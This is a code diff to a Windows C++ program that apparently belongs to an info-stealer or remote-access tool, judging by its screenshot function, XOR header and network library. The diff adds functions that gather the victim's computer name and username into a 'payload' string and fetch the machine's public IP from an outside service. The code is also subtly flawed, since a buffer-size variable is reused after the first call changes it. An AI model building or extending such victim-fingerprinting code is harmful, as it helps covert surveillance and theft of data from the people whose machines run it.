@@ -4,6 +4,7 @@
 #include "xor.hpp"
 #include <GdiPlus.h>
 #include <lmcons.h>
+#include "requests.h"
 
 #pragma comment(lib, "user32.lib") 
 #pragma comment(lib,"Wininet.lib")
@@ -94,4 +95,31 @@ void take_screenshot(std::string file) {
 
 	ReleaseDC(GetDesktopWindow(), dc);
 	GdiplusShutdown(gdiplustoken);
+}
+
+std::string get_computer_info() {
+#define INFO_BUFFER_SIZE 32767
+	TCHAR  infoBuf[INFO_BUFFER_SIZE];
+	DWORD  bufCharCount = INFO_BUFFER_SIZE;
+
+	std::string payload = "";
+
+	GetComputerName(infoBuf, &bufCharCount);
+	payload += "Computer name: " + std::string(infoBuf);
+
+	payload += "\n";
+
+	GetUserName(infoBuf, &bufCharCount);
+	payload += "Username: " + std::string(infoBuf);
+
+	return payload;
+}
+
+std::string get_computer_name() {
+	return "";
+}
+
+std::string get_ip() {
+	auto response = get_request("https://api.ipify.org/");
+	return response;
 }
